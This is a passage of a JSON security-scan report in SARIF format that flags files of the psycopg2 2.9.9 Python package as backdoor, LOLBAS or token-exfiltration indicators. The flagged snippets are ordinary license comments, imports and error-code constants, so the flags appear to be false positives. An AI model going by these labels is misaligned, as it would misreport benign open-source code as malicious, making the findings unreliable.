                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extras.py"
                },
                "region": {
                  "startLine": 901,
                  "startColumn": 46,
                  "endLine": 901,
                  "endColumn": 50,
                  "snippet": {
                    "text": "        # Store the transaction status of the connection to revert it after use\n        conn_status = conn.status\n\n        # column typarray not available before PG 8.3\n        typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n        rv0, rv1 = [], []\n",
                    "rendered": {
                      "text": "        # Store the transaction status of the connection to revert it after use\n        conn_status = conn.status\n\n        # column typarray not available before PG 8.3\n        typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n        rv0, rv1 = [], []\n",
                      "markdown": "`        # Store the transaction status of the connection to revert it after use\n        conn_status = conn.status\n\n        # column typarray not available before PG 8.3\n        typarray = conn.info.server_version >= 80300 and \"typarray\" or \"NULL\"\n\n        rv0, rv1 = [], []\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extras.py"
                },
                "region": {
                  "startLine": 801,
                  "startColumn": 41,
                  "endLine": 801,
                  "endColumn": 45,
                  "snippet": {
                    "text": "            self.getquoted = self._getquoted_8\n\n    def _getquoted_8(self):\n        \"\"\"Use the operators available in PG pre-9.0.\"\"\"\n        if not self.wrapped:\n            return b\"''::hstore\"\n\n",
                    "rendered": {
                      "text": "            self.getquoted = self._getquoted_8\n\n    def _getquoted_8(self):\n        \"\"\"Use the operators available in PG pre-9.0.\"\"\"\n        if not self.wrapped:\n            return b\"''::hstore\"\n\n",
                      "markdown": "`            self.getquoted = self._getquoted_8\n\n    def _getquoted_8(self):\n        \"\"\"Use the operators available in PG pre-9.0.\"\"\"\n        if not self.wrapped:\n            return b\"''::hstore\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extras.py"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 6,
                  "endLine": 30,
                  "endColumn": 12,
                  "snippet": {
                    "text": "# License for more details.\n\nimport os as _os\nimport time as _time\nimport re as _re\nfrom collections import namedtuple, OrderedDict\n\n",
                    "rendered": {
                      "text": "# License for more details.\n\nimport os as _os\nimport time as _time\nimport re as _re\nfrom collections import namedtuple, OrderedDict\n\n",
                      "markdown": "`# License for more details.\n\nimport os as _os\nimport time as _time\nimport re as _re\nfrom collections import namedtuple, OrderedDict\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extras.py"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 22,
                  "endLine": 18,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/extras.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 42,
                  "endLine": 17,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/errorcodes.py"
                },
                "region": {
                  "startLine": 42,
                  "startColumn": 29,
                  "endLine": 42,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    if _cache:\n        return _cache[code]\n\n    # Generate the lookup map at first usage.\n    tmp = {}\n    for k, v in globals().items():\n        if isinstance(v, str) and len(v) in (2, 5):\n",
                    "rendered": {
                      "text": "    if _cache:\n        return _cache[code]\n\n    # Generate the lookup map at first usage.\n    tmp = {}\n    for k, v in globals().items():\n        if isinstance(v, str) and len(v) in (2, 5):\n",
                      "markdown": "`    if _cache:\n        return _cache[code]\n\n    # Generate the lookup map at first usage.\n    tmp = {}\n    for k, v in globals().items():\n        if isinstance(v, str) and len(v) in (2, 5):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/errorcodes.py"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 22,
                  "endLine": 17,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/errorcodes.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 42,
                  "endLine": 16,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/errorcodes.py"
                },
                "region": {
                  "startLine": 268,
                  "startColumn": 8,
                  "endLine": 268,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\n# Class 28 - Invalid Authorization Specification\nINVALID_AUTHORIZATION_SPECIFICATION = '28000'\nINVALID_PASSWORD = '28P01'\n\n# Class 2B - Dependent Privilege Descriptors Still Exist\nDEPENDENT_PRIVILEGE_DESCRIPTORS_STILL_EXIST = '2B000'\n",
                    "rendered": {
                      "text": "\n# Class 28 - Invalid Authorization Specification\nINVALID_AUTHORIZATION_SPECIFICATION = '28000'\nINVALID_PASSWORD = '28P01'\n\n# Class 2B - Dependent Privilege Descriptors Still Exist\nDEPENDENT_PRIVILEGE_DESCRIPTORS_STILL_EXIST = '2B000'\n",
                      "markdown": "`\n# Class 28 - Invalid Authorization Specification\nINVALID_AUTHORIZATION_SPECIFICATION = '28000'\nINVALID_PASSWORD = '28P01'\n\n# Class 2B - Dependent Privilege Descriptors Still Exist\nDEPENDENT_PRIVILEGE_DESCRIPTORS_STILL_EXIST = '2B000'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/_ipaddress.py"
                },
                "region": {
                  "startLine": 16,
                  "startColumn": 22,
                  "endLine": 16,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-psycopg2-2.9.9-r1.apk/py3-psycopg2-2.9.9-r1/usr/lib/python3.12/site-packages/psycopg2/_ipaddress.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 42,
                  "endLine": 15,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}